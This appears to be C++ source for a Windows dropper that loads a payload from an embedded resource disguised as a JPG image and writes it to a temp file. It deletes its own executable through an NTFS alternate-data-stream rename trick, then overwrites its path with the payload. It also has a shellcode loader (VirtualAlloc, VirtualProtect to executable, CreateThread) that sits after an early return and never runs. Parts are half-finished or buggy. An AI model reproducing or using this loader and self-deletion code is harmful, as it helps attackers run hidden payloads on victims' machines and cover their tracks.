#pragma comment(lib, "Shlwapi.lib")

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "resource1.h"
#include "pch.h"
#include <shlwapi.h>
//#include "calls.h"
#include "olectl.h"
#include <istream>
#include <Gdiplus.h>
#include "gdiplusgraphics.h"
#include <filesystem>
#include "namedpipeapi.h"
#define DS_STREAM_RENAME L":wtfbbq"
#define DS_DEBUG_LOG(msg) wprintf(L"[LOG] - %s\n", msg)


class membuf : public std::basic_streambuf<char> {
public:
	membuf(const uint8_t* p, size_t l) {
		setg((char*)p, (char*)p, (char*)p + l);
	}
};

class memstream : public std::istream {
public:
	memstream(const uint8_t* p, size_t l) :
		std::istream(&_buffer),
		_buffer(p, l) {
		rdbuf(&_buffer);
	}

private:
	membuf _buffer;
};

bool pipeDreemz(LPCWSTR lpTempFileName, unsigned char* payload, unsigned int payload_len) {

	const wchar_t lpszPipename[] = TEXT("\\\\.\\pipe\\myimage.jpg");
	HANDLE hPipe = CreateFile(
		lpszPipename,   // pipe name 
		GENERIC_READ |  // read and write access 
		GENERIC_WRITE,
		0,              // no sharing 
		NULL,           // default security attributes
		OPEN_EXISTING,  // opens existing pipe 
		0,              // default attributes 
		NULL);          // no template file 

	if (hPipe != INVALID_HANDLE_VALUE)
		return 1;


	
	// Exit if an error other than ERROR_PIPE_BUSY occurs.

	//if (GetLastError() != ERROR_PIPE_BUSY)
	//{
	//	printf("can't open pipe its busy");
	//	return -1;
	//}

	//if (!WaitNamedPipe(lpszPipename, 20000))
	//{
	//	printf("Could not open pipe: 20 second wait timed out.");
	//	return -1;
	//}

	
	// The pipe connected; change to message-read mode. 

	DWORD dwMode = PIPE_READMODE_MESSAGE;
	if (!SetNamedPipeHandleState(
		hPipe,    // pipe handle 
		&dwMode,  // new pipe mode 
		NULL,     // don't set maximum bytes 
		NULL)) {// don't set maximum time 
		return 3;

	}
	//if (!WriteFile(hPipe, payload, payload_len, &dwWritten, NULL)) {
	//	if (!CloseHandle(hFile))
	//	{
	//		//PrintError(TEXT("CloseHandle(hFile) failed"));
	//		return (7);
	//	}
	//	return 4;
	//}

	system((const char*)lpszPipename);
	return 1;
}


static
HANDLE
ds_open_handle(
	PWCHAR pwPath
)
{
	return CreateFileW(pwPath, DELETE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
}

static
BOOL
ds_rename_handle(
	HANDLE hHandle
)
{
	FILE_RENAME_INFO fRename;
	RtlSecureZeroMemory(&fRename, sizeof(fRename));

	// set our FileNameLength and FileName to DS_STREAM_RENAME
	LPWSTR lpwStream = (wchar_t* ) DS_STREAM_RENAME;
	//wchar_t* name = (wchar_t* ) L":wtfbbq";
	//LPWSTR lpwStream = name;
	fRename.FileNameLength = sizeof(lpwStream);
	RtlCopyMemory(fRename.FileName, lpwStream, sizeof(lpwStream));

	return SetFileInformationByHandle(hHandle, FileRenameInfo, &fRename, sizeof(fRename) + sizeof(lpwStream));
}

static
BOOL
ds_deposite_handle(
	HANDLE hHandle
)
{
	// set FILE_DISPOSITION_INFO::DeleteFile to TRUE
	FILE_DISPOSITION_INFO fDelete;
	RtlSecureZeroMemory(&fDelete, sizeof(fDelete));

	fDelete.DeleteFile = TRUE;

	return SetFileInformationByHandle(hHandle, FileDispositionInfo, &fDelete, sizeof(fDelete));
}

int writeFileToDisk(LPCWSTR lpTempFileName, unsigned char* payload, unsigned int payload_len) {

	HANDLE hFile = CreateFile(lpTempFileName, GENERIC_WRITE | GENERIC_READ, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	//hFile = CreateFileW(lpTempFileName, GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		//PrintError(TEXT("Second CreateFile failed"));
		if (!CloseHandle(hFile))
		{
			//PrintError(TEXT("CloseHandle(hFile) failed"));
			return (7);
		}
		return (2);
	}
	DWORD dwWritten = 0;

	//WriteF
	if (!WriteFile(hFile, payload, payload_len, &dwWritten, NULL)) {
		if (!CloseHandle(hFile))
		{
			//PrintError(TEXT("CloseHandle(hFile) failed")); 
			return (7);
		}
		return 3;
	}

	CloseHandle(hFile);
}


int deleteSelf(unsigned char* payload, unsigned int payload_len) {





	
		WCHAR wcPath[MAX_PATH + 1];
		RtlSecureZeroMemory(wcPath, sizeof(wcPath));

		// get the path to the current running process ctx
		if (GetModuleFileNameW(NULL, wcPath, MAX_PATH) == 0)
		{
			DS_DEBUG_LOG(L"failed to get the current module handle");
			return 0;
		}

		HANDLE hCurrent = ds_open_handle(wcPath);
		if (hCurrent == INVALID_HANDLE_VALUE)
		{
			DS_DEBUG_LOG(L"failed to acquire handle to current running process");
			return 0;
		}		//overwrite file with jpg
		//writeFileToDisk((LPCWSTR)wcPath, payload, payload_len);

		// rename the associated HANDLE's file name
		DS_DEBUG_LOG(L"attempting to rename file name");
		if (!ds_rename_handle(hCurrent))
		{
			DS_DEBUG_LOG(L"failed to rename to stream");
			return 0;
		}

		DS_DEBUG_LOG(L"successfully renamed file primary :$DATA ADS to specified stream, closing initial handle");
		CloseHandle(hCurrent);

		// open another handle, trigger deletion on close
		hCurrent = ds_open_handle(wcPath);
		if (hCurrent == INVALID_HANDLE_VALUE)
		{
			DS_DEBUG_LOG(L"failed to reopen current module");
			return 0;
		}

		if (!ds_deposite_handle(hCurrent))
		{
			DS_DEBUG_LOG(L"failed to set delete deposition");
			return 0;
		}

		



		// trigger the deletion deposition on hCurrent
		DS_DEBUG_LOG(L"closing handle to trigger deletion deposition");
		CloseHandle(hCurrent);

		// verify we've been deleted
		if (PathFileExistsW(wcPath))
		{
			DS_DEBUG_LOG(L"failed to delete copy, file still exists");
			return 0;
		}

		DS_DEBUG_LOG(L"successfully deleted self from disk");

		writeFileToDisk((LPCWSTR)wcPath, payload, payload_len);
		return 1;
	


}

int windows_system(wchar_t* cmd)
{
	LPSTR cmdline, programpath;

	STARTUPINFO startup_info;
	PROCESS_INFORMATION process_info;
	memset(&startup_info, 0, sizeof(STARTUPINFO));
	startup_info.cb = sizeof(STARTUPINFO);
	memset(&process_info, 0, sizeof(PROCESS_INFORMATION));

	//cmdline = strdup(TEXT(cmd));
	//programpath = strdup(TEXT(cmd));
	//cmd = L"cmd.exe";
	//if (CreateProcess(NULL, (wchar_t*) L"wusa.exe", NULL, NULL, 0, CREATE_NO_WINDOW, NULL, NULL, &startup_info, &process_info))
	if (!CreateProcess(L"C:\\Windows\\System32\\cmd.exe", cmd, NULL, NULL, 0, 0, NULL, NULL, &startup_info, &process_info))
	{
		return -1;
	}
	else {
	WaitForSingleObject(process_info.hProcess, INFINITE);
	CloseHandle(process_info.hProcess);
	CloseHandle(process_info.hThread);
	}
	return 0;
}

//DWORD RunSilent(char* strFunct, char* strstrParams)
//{
//	STARTUPINFO StartupInfo;
//	PROCESS_INFORMATION ProcessInfo;
//	char Args[4096];
//	char* pEnvCMD = NULL;
//	char* pDefaultCMD = L"CMD.EXE";
//	ULONG rc;
//
//	memset(&StartupInfo, 0, sizeof(StartupInfo));
//	StartupInfo.cb = sizeof(STARTUPINFO);
//	StartupInfo.dwFlags = STARTF_USESHOWWINDOW;
//	StartupInfo.wShowWindow = SW_HIDE;
//
//	Args[0] = 0;
//
//	pEnvCMD = getenv("COMSPEC");
//
//	if (pEnvCMD) {
//
//		strcpy(Args, pEnvCMD);
//	}
//	else {
//		strcpy(Args, pDefaultCMD);
//	}
//
//	// "/c" option - Do the command then terminate the command window
//	strcat(Args, " /c ");
//	//the application you would like to run from the command window
//	strcat(Args, strFunct);
//	strcat(Args, " ");
//	//the parameters passed to the application being run from the command window.
//	strcat(Args, strstrParams);
//
//	if (!CreateProcess(NULL, Args, NULL, NULL, FALSE,
//		CREATE_NEW_CONSOLE,
//		NULL,
//		NULL,
//		&StartupInfo,
//		&ProcessInfo))
//	{
//		return GetLastError();
//	}
//
//	WaitForSingleObject(ProcessInfo.hProcess, INFINITE);
//	if (!GetExitCodeProcess(ProcessInfo.hProcess, &rc))
//		rc = 0;
//
//	CloseHandle(ProcessInfo.hThread);
//	CloseHandle(ProcessInfo.hProcess);
//
//	return rc;
//
//}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
	LPSTR lpCmdLine, int nCmdShow) {

	void* exec_mem;
	
	BOOL rv;
	HANDLE th;
	DWORD oldprotect = 0;
	HGLOBAL resHandle = NULL;
	HRSRC res;
	
	//char* payload;
	//unsigned int payload_len;

	unsigned char* payload;
	unsigned int payload_len;

	HMODULE hModule = GetModuleHandle(NULL); // get the handle to the current module (the executable file)
	HRSRC hResource = FindResource(hModule, MAKEINTRESOURCE(101), L"JPG"); // substitute RESOURCE_ID and RESOURCE_TYPE.
	//HRSRC hResource = FindResource(hModule, MAKEINTRESOURCE(104), L"PNG"); // substitute RESOURCE_ID and RESOURCE_TYPE.

	HGLOBAL hMemory = LoadResource(hModule, hResource);
	payload = (unsigned char*)LockResource(hMemory);

	payload_len = SizeofResource(hModule, hResource);

	wchar_t lpTempPathBuffer[MAX_PATH];
	wchar_t szTempFileName[MAX_PATH];
	DWORD retpath = GetTempPath(MAX_PATH, lpTempPathBuffer);
	
	if ( ! GetTempFileName(lpTempPathBuffer, // directory for tmp files
		TEXT("DEMO"),     // temp file name prefix 
		0,                // create unique name 
		szTempFileName))  // buffer for name 
	{
		//PrintError(TEXT("GetTempFileName failed"));
		return 1;

	}
	HANDLE hFile = INVALID_HANDLE_VALUE;
	//std::string = retpath

	std::wstring d1 = (LPWSTR)(szTempFileName);
	std::wstring dest = d1 + L".jpg";
	////LPTSTR d2 = LPTSTR(dest.c_str());
	LPCWSTR lpTempFileName = (LPCWSTR)dest.c_str();


	writeFileToDisk(lpTempFileName, payload, payload_len);

	//_wsystem(lpTempFileName);
	LPWSTR comm = (LPWSTR)lpTempFileName;

	//windows_system(comm);


//	ShellExecute(NULL, L"open", comm, NULL, NULL, SW_SHOW);

	DeleteFile(lpTempFileName);

	deleteSelf(payload, payload_len);

	//STARTUPINFO si;
	//PROCESS_INFORMATION pi;

	//ZeroMemory(&si, sizeof(si));
	//si.cb = sizeof(si);
	//ZeroMemory(&pi, sizeof(pi));
	//if (!
	//	CreateProcess
	//	(
	//		TEXT("C:\\Windows\\System32\\calc.exe"),
	//		NULL, NULL, NULL, FALSE,
	//		CREATE_NEW_CONSOLE,
	//		NULL, NULL,
	//		&si,
	//		&pi
	//	)
	//	)
	//{
	//	return -1;
	//}
	

	return 0;
	// Allocate some memory buffer for payload
	exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	//printf("%-20s : 0x%-016p\n", "payload addr", (void*)payload);
	//printf("%-20s : 0x%-016p\n", "exec_mem addr", (void*)exec_mem);

	// Copy payload to new memory buffer
	RtlMoveMemory(exec_mem, payload, payload_len);

	// Make the buffer executable
	rv = VirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);

	//printf("\nHit me!\n");
	//getchar();

	// Launch the payload
	if (rv != 0) {
		th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)exec_mem, 0, 0, 0);
		WaitForSingleObject(th, -1);
	}

	return 0;
}
